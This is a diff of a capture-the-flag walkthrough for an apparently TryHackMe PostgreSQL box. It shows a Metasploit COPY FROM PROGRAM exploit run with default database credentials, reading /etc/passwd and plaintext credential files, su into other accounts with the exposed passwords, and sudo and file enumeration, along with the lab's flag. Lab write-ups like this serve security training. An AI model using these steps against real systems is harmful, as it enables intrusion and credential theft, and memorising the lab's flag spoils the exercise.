@@ -315,24 +315,55 @@ Matching Modules
    6   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
 ```
 # Compromise the machine and locate user.txt
-using exploit/multi/postgres/postgres_copy_from_program_cmd_exec 
-set username to postgres
-set password to password
-set lhost to tun0
-following command to search system for user.txt and send 'permission denied' to garbage
-```bash
-find / -name user.txt 2>/dev/null
+- using exploit/multi/postgres/postgres_copy_from_program_cmd_exec 
+- set username to postgres
+- set password to password
+- set lhost to tun0
 ```
 cat /etc/passwd reveals users Alison and Dark
-Alison has user.txt in their home dir but permission denied to postgres user
-Dark has credentials.txt in their home dir with contents qwerty1234#!hackme
-su dark:qwerty1234#!hackme
+```bash
+postgres@ubuntu:/var/lib/postgresql/9.5/main$ cat /etc/passwd
+cat /etc/passwd
+#/home/dark/credentials.txt
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+...
+uuidd:x:107:111::/run/uuidd:/bin/false
+alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
+sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
+postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+dark:x:1001:1001::/home/dark:
+```
+- Alison has user.txt in their home dir but permission denied to postgres user
+- following command to search system for user.txt and send 'permission denied' to garbage
+```bash
+postgres@ubuntu:/var/lib/postgresql/9.5/main$ find / -name user.txt 2>/dev/null
+<stgresql/9.5/main$ find / -name user.txt 2>/dev/null                        
+/home/alison/user.txt
+```
 
-sudo -l no root permissions
+- Dark has credentials.txt in their home dir with contents qwerty1234#!hackme
+- su dark:qwerty1234#!hackme
+```bash
+postgres@ubuntu:/home/dark$ cat credentials.txt
+cat credentials.txt
+dark:qwerty1234#!hackme
+```
 
-enumerating what dark has access to
-find / -user dark 2>/dev/null find | grep -v '/proc'
+- sudo -l no root permissions
+```bash
+dark@ubuntu:~$ sudo -l
+sudo -l
+[sudo] password for dark: qwerty1234#!hackme
 
+Sorry, user dark may not run sudo on ubuntu.
+```
+
+- enumerating what dark has access to
+- find / -user dark 2>/dev/null find | grep -v '/proc'
 ```bash
 dark@ubuntu:~$ find / -user dark 2>/dev/null | grep -v '/proc'
 find / -user dark 2>/dev/null | grep -v '/proc'
@@ -355,7 +386,8 @@ find / -user dark 2>/dev/null | grep -v '/proc'
 /run/user/1001/systemd/private
 /run/user/1001/systemd/notify
 ```
-find / -group dark 2>/dev/null
+
+- find / -group dark 2>/dev/null
 ```bash
 dark@ubuntu:~$ find / -group dark 2>/dev/null | grep -v '/proc'
 find / -group dark 2>/dev/null | grep -v '/proc'
@@ -380,6 +412,9 @@ find / -group dark 2>/dev/null | grep -v '/proc'
 
 ```
 
+- digging around like a blind man looking for nickel 
+- /var/www/html/config.php
+- reveals alison's password, shame shame we know your name. 
 ```bash
 ark@ubuntu:/var/lib/postgresql$ cat /var/www/html/config.php
 cat /var/www/html/config.php
@@ -391,12 +426,17 @@ cat /var/www/html/config.php
         $dbname = "mysudopassword";
 ```
 
+- using password to login to Alison
 ```bash
+dark@ubuntu:/var/lib/postgresql$ su alison
+su alison
+Password: p4ssw0rdS3cur3!#
 alison@ubuntu:/var/lib/postgresql$ cat /home/alison/user.txt
 cat /home/alison/user.txt
 THM{postgresql_fa1l_conf1gurat1on}
 ```
 
+- using sudo -l to reveal Alison's sudo permisisons reveal that Alison can run sudo commands
 ```bash
 alison@ubuntu:/var/lib/postgresql$ sudo -l 
 sudo -l
